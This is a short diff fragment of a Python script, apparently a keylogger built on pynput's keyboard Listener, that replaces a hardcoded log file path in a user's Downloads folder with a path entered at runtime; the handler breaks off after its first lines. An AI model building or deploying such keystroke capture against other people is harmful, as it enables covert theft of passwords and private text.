@@ -1,6 +1,6 @@
 from pynput.keyboard import Listener
 
-log_file="C:\\Users\\Arjun\\Downloads\\key.txt"
+log_file=input("Enter the path: ")
 
 def on_press(key):
     try:
